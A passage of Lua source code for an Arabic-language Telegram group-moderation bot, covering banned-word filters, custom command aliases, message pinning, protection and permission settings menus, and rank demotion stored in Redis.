return LuaTele.sendText(msg_chat_id,msg_id,"*• لا يوجد كلمات ممنوعه هنا*","md",true)   
end  
Filter = '\n*• قائمه المنع \n ٴ— — — — — — — — — —*\n'
for k,v in pairs(list) do  
print(v)
if v:match('photo:(.*)') then
ver = 'صوره'
elseif v:match('animation:(.*)') then
ver = 'متحركه'
elseif v:match('sticker:(.*)') then
ver = 'ملصق'
elseif v:match('text:(.*)') then
ver = v:gsub('text:',"") 
end
v = v:gsub('photo:',"") 
v = v:gsub('sticker:',"") 
v = v:gsub('animation:',"") 
v = v:gsub('text:',"") 
local Text_Filter = Redis:get(LaRiCa.."Filter:Group:"..v..msg_chat_id)   
Filter = Filter.."*"..k.."- "..ver.." » { "..Text_Filter.." }*\n"    
end  
LuaTele.sendText(msg_chat_id,msg_id,Filter,"md",true)  
end  
if text == "منع" then       
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'true')
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• ارسل الان { ملصق ,متحركه ,صوره ,رساله }*',"md",true)  
end    
if text == "الغاء منع" then    
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'DelFilter')
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• ارسل الان { ملصق ,متحركه ,صوره ,رساله }*',"md",true)  
end

if text == "اضف امر عام" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
return LuaTele.sendText(msg_chat_id,msg_id,"• الان ارسل لي الامر القديم ...","md",true)
end
if text == "حذف امر عام" or text == "مسح امر عام" then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
end
if text == "حذف الاوامر المضافه العامه" or text == "مسح الاوامر المضافه العامه" then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."All:Command:List:Group")
for k,v in pairs(list) do
Redis:del(LaRiCa.."All:Get:Reides:Commands:Group"..v)
Redis:del(LaRiCa.."All:Command:List:Group")
end
return LuaTele.sendText(msg_chat_id,msg_id,"• تم مسح جميع الاوامر التي تم اضافتها في العام","md",true)
end
if text == "الاوامر المضافه العامه" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."All:Command:List:Group")
Command = "• قائمه الاوامر المضافه العامه  \nٴ— — — — — — — — — —\n"
for k,v in pairs(list) do
Commands = Redis:get(LaRiCa.."All:Get:Reides:Commands:Group"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "• لا توجد اوامر اضافيه عامه"
end
return LuaTele.sendText(msg_chat_id,msg_id,Command,"md",true)
end


if text == "اضف امر" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الامر القديم ","md",false, false, false, false, reply_markup)
end
if text == "حذف امر" or text == "مسح امر" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
end
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."Command:List:Group"..msg_chat_id)
for k,v in pairs(list) do
Redis:del(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..v)
Redis:del(LaRiCa.."Command:List:Group"..msg_chat_id)
end
return LuaTele.sendText(msg_chat_id,msg_id,"• تم مسح جميع الاوامر التي تم اضافتها","md",true)
end
if text == "الاوامر المضافه" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."Command:List:Group"..msg_chat_id.."")
Command = "• قائمه الاوامر المضافه  \nٴ— — — — — — — — — —\n"
for k,v in pairs(list) do
Commands = Redis:get(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "• لا توجد اوامر اضافيه"
end
return LuaTele.sendText(msg_chat_id,msg_id,Command,"md",true)
end

if text == "تثبيت" and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).PinMsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تثبيت الرسائل* ',"md",true)  
end
LuaTele.sendText(msg_chat_id,msg_id,"\n• تم تثبيت الرساله","md",true)
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local PinMsg = LuaTele.pinChatMessage(msg_chat_id,Message_Reply.id,true)
end

if text == 'الغاء تثبيت الكل' or text == "الغاء التثبيت" then 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).PinMsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تثبيت الرسائل* ',"md",true)  
end
LuaTele.sendText(msg_chat_id,msg_id,"\n• تم الغاء تثبيت كل الرسائل","md",true)
LuaTele.unpinAllChatMessages(msg_chat_id)
end
if text == "الحمايه" or text == "اوامر التعطيل" or text == "اوامر التفعيل" then      
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تعطيل الرابط', data = msg.sender.user_id..'/'.. 'unmute_link'},{text = 'تفعيل الرابط', data = msg.sender.user_id..'/'.. 'mute_link'},
},
{
{text = 'تعطيل الترحيب', data = msg.sender.user_id..'/'.. 'unmute_welcome'},{text = 'تفعيل الترحيب', data = msg.sender.user_id..'/'.. 'mute_welcome'},
},
{
{text = 'اتعطيل الايدي', data = msg.sender.user_id..'/'.. 'unmute_Id'},{text = 'اتفعيل الايدي', data = msg.sender.user_id..'/'.. 'mute_Id'},
},
{
{text = 'تعطيل الايدي بالصوره', data = msg.sender.user_id..'/'.. 'unmute_IdPhoto'},{text = 'تفعيل الايدي بالصوره', data = msg.sender.user_id..'/'.. 'mute_IdPhoto'},
},
{
{text = 'تعطيل الردود', data = msg.sender.user_id..'/'.. 'unmute_ryple'},{text = 'تفعيل الردود', data = msg.sender.user_id..'/'.. 'mute_ryple'},
},
{
{text = 'تعطيل الردود العامه', data = msg.sender.user_id..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = msg.sender.user_id..'/'.. 'mute_ryplesudo'},
},
{
{text = 'تعطيل الرفع', data = msg.sender.user_id..'/'.. 'unmute_setadmib'},{text = 'تفعيل الرفع', data = msg.sender.user_id..'/'.. 'mute_setadmib'},
},
{
{text = 'تعطيل الطرد', data = msg.sender.user_id..'/'.. 'unmute_kickmembars'},{text = 'تفعيل الطرد', data = msg.sender.user_id..'/'.. 'mute_kickmembars'},
},
{
{text = 'تعطيل الالعاب', data = msg.sender.user_id..'/'.. 'unmute_games'},{text = 'تفعيل الالعاب', data = msg.sender.user_id..'/'.. 'mute_games'},
},
{
{text = 'تعطيل اطردني', data = msg.sender.user_id..'/'.. 'unmute_kickme'},{text = 'تفعيل اطردني', data = msg.sender.user_id..'/'.. 'mute_kickme'},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id, '• اوامر التفعيل والتعطيل ', 'md', false, false, false, false, reply_markup)
end  
if text == 'اعدادات الحمايه' then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:get(LaRiCa.."Status:Link"..msg.chat_id) then
Statuslink = '❬ ✓ ❭' else Statuslink = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:Welcome"..msg.chat_id) then
StatusWelcome = '❬ ✓ ❭' else StatusWelcome = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:Id"..msg.chat_id) then
StatusId = '❬ ✓ ❭' else StatusId = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:IdPhoto"..msg.chat_id) then
StatusIdPhoto = '❬ ✓ ❭' else StatusIdPhoto = '❬ ✗ ❭'
end
if not Redis:get(LaRiCa.."Status:Reply"..msg.chat_id) then
StatusReply = '❬ ✓ ❭' else StatusReply = '❬ ✗ ❭'
end
if not Redis:get(LaRiCa.."Status:ReplySudo"..msg.chat_id) then
StatusReplySudo = '❬ ✓ ❭' else StatusReplySudo = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:BanId"..msg.chat_id)  then
StatusBanId = '❬ ✓ ❭' else StatusBanId = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:SetId"..msg.chat_id) then
StatusSetId = '❬ ✓ ❭' else StatusSetId = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
StatusGames = '❬ ✓ ❭' else StatusGames = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:KickMe"..msg.chat_id) then
Statuskickme = '❬ ✓ ❭' else Statuskickme = '❬ ✗ ❭'
end
if Redis:get(LaRiCa.."Status:AddMe"..msg.chat_id) then
StatusAddme = '❬ ✓ ❭' else StatusAddme = '❬ ✗ ❭'
end
local protectionGroup = '\n*• اعدادات حمايه الكروب\n ٴ— — — — — — — — — —\n'
..'\n• جلب الرابط ➤ '..Statuslink
..'\n• جلب الترحيب ➤ '..StatusWelcome
..'\n• الايدي ➤ '..StatusId
..'\n• الايدي بالصوره ➤ '..StatusIdPhoto
..'\n• الردود ➤ '..StatusReply
..'\n• الردود العامه ➤ '..StatusReplySudo
..'\n• الرفع ➤ '..StatusSetId
..'\n• الحظر - الطرد ➤ '..StatusBanId
..'\n• الالعاب ➤ '..StatusGames
..'\n• امر اطردني ➤ '..Statuskickme..'*\n\n.'
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
  {text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id,protectionGroup,'md', false, false, false, false, reply_markup)
end
if text == "الاعدادات" then    
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Text = "*\n• اعدادات الكروب ".."\n🔏︙علامة ال (✓) تعني مقفول".."\n🔓︙علامة ال (✗) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(msg_chat_id).lock_links, data = '&'},{text = 'الروابط : ', data =msg.sender.user_id..'/'.. 'Status_link'},
},
{
{text = GetSetieng(msg_chat_id).lock_spam, data = '&'},{text = 'الكلايش : ', data =msg.sender.user_id..'/'.. 'Status_spam'},
},
{
{text = GetSetieng(msg_chat_id).lock_inlin, data = '&'},{text = 'الكيبورد : ', data =msg.sender.user_id..'/'.. 'Status_keypord'},
},
{
{text = GetSetieng(msg_chat_id).lock_vico, data = '&'},{text = 'الاغاني : ', data =msg.sender.user_id..'/'.. 'Status_voice'},
},
{
{text = GetSetieng(msg_chat_id).lock_gif, data = '&'},{text = 'المتحركه : ', data =msg.sender.user_id..'/'.. 'Status_gif'},
},
{
{text = GetSetieng(msg_chat_id).lock_file, data = '&'},{text = 'الملفات : ', data =msg.sender.user_id..'/'.. 'Status_files'},
},
{
{text = GetSetieng(msg_chat_id).lock_text, data = '&'},{text = 'الدردشه : ', data =msg.sender.user_id..'/'.. 'Status_text'},
},
{
{text = GetSetieng(msg_chat_id).lock_ved, data = '&'},{text = 'الفيديو : ', data =msg.sender.user_id..'/'.. 'Status_video'},
},
{
{text = GetSetieng(msg_chat_id).lock_photo, data = '&'},{text = 'الصور : ', data =msg.sender.user_id..'/'.. 'Status_photo'},
},
{
{text = GetSetieng(msg_chat_id).lock_user, data = '&'},{text = 'المعرفات : ', data =msg.sender.user_id..'/'.. 'Status_username'},
},
{
{text = GetSetieng(msg_chat_id).lock_hash, data = '&'},{text = 'التاك : ', data =msg.sender.user_id..'/'.. 'Status_tags'},
},
{
{text = GetSetieng(msg_chat_id).lock_bots, data = '&'},{text = 'البوتات : ', data =msg.sender.user_id..'/'.. 'Status_bots'},
},
{
{text = '٬ ꪀꫀ᥊𝓽 ٫ ', data =msg.sender.user_id..'/'.. 'NextSeting'}
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id, Text, 'md', false, false, false, false, reply_markup)
end  


if text == 'الكروب' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
local Get_Chat = LuaTele.getChat(msg_chat_id)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✓ ❭' else web = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✓ ❭' else info = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✓ ❭' else invite = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✓ ❭' else pin = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✓ ❭' else media = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✓ ❭' else messges = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✓ ❭' else other = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✓ ❭' else polls = '❬ ✗ ❭'
end
local permissions = '*\n• صلاحيات الكروب :\nٴ— — — — — — — — — —'..'\n• ارسال الويب : '..web..'\n• تغيير معلومات الكروب : '..info..'\n• اضافه مستخدمين : '..invite..'\n• تثبيت الرسائل : '..pin..'\n• ارسال الميديا : '..media..'\n• ارسال الرسائل : '..messges..'\n• اضافه البوتات : '..other..'\n• ارسال استفتاء : '..polls..'*\n\n'
local TextChat = '*\n• معلومات الكروب :\nٴ— — — — — — — — — —'..' \n• عدد الادمنيه : ❬ '..Info_Chats.administrator_count..' ❭\n• عدد المحظورين : ❬ '..Info_Chats.banned_count..' ❭\n• عدد الاعضاء : ❬ '..Info_Chats.member_count..' ❭\n• عدد المقيديين : ❬ '..Info_Chats.restricted_count..' ❭\n• اسم الكروب : ❬* ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')* ❭*'
return LuaTele.sendText(msg_chat_id,msg_id, TextChat..permissions,"md",true)
end
if text == 'صلاحيات الكروب' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✓ ❭' else web = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✓ ❭' else info = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✓ ❭' else invite = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✓ ❭' else pin = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✓ ❭' else media = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✓ ❭' else messges = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✓ ❭' else other = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✓ ❭' else polls = '❬ ✗ ❭'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- ارسال الويب : '..web, data = msg.sender.user_id..'/web'}, 
},
{
{text = '- تغيير معلومات الكروب : '..info, data =msg.sender.user_id..  '/info'}, 
},
{
{text = '- اضافه مستخدمين : '..invite, data =msg.sender.user_id..  '/invite'}, 
},
{
{text = '- تثبيت الرسائل : '..pin, data =msg.sender.user_id..  '/pin'}, 
},
{
{text = '- ارسال الميديا : '..media, data =msg.sender.user_id..  '/media'}, 
},
{
{text = '- ارسال الرسائل : .'..messges, data =msg.sender.user_id..  '/messges'}, 
},
{
{text = '- اضافه البوتات : '..other, data =msg.sender.user_id..  '/other'}, 
},
{
{text = '- ارسال استفتاء : '..polls, data =msg.sender.user_id.. '/polls'}, 
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =msg.sender.user_id..'/'.. '/delAmr'}
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id, "• الصلاحيات - ", 'md', false, false, false, false, reply_markup)
end
if text == 'تنزيل الكل' and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Redis:sismember(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id) then
dev = "المطور ،" else dev = "" end
if Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
crr = "منشئ اساسي ،" else crr = "" end
if Redis:sismember(LaRiCa..'Creator:Group'..msg_chat_id, Message_Reply.sender.user_id) then
cr = "منشئ ،" else cr = "" end
if Redis:sismember(LaRiCa..'Manger:Group'..msg_chat_id, Message_Reply.sender.user_id) then
own = "مدير ،" else own = "" end
if Redis:sismember(LaRiCa..'Admin:Group'..msg_chat_id, Message_Reply.sender.user_id) then
mod = "ادمن ،" else mod = "" end
if Redis:sismember(LaRiCa..'Special:Group'..msg_chat_id, Message_Reply.sender.user_id) then
vip = "مميز ،" else vip = ""
end
if The_ControllerAll(Message_Reply.sender.user_id) == true then
Rink = 1
elseif Redis:sismember(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id)  then
Rink = 2
elseif Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 3
elseif Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 4
elseif Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 5
elseif Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 6
elseif Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 7
else
Rink = 8
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• ليس لديه اي رتبه هنا*","md",true)  
end
if msg.ControllerBot then
if Rink == 1 or Rink < 1 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Dev then
if Rink == 2 or Rink < 2 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
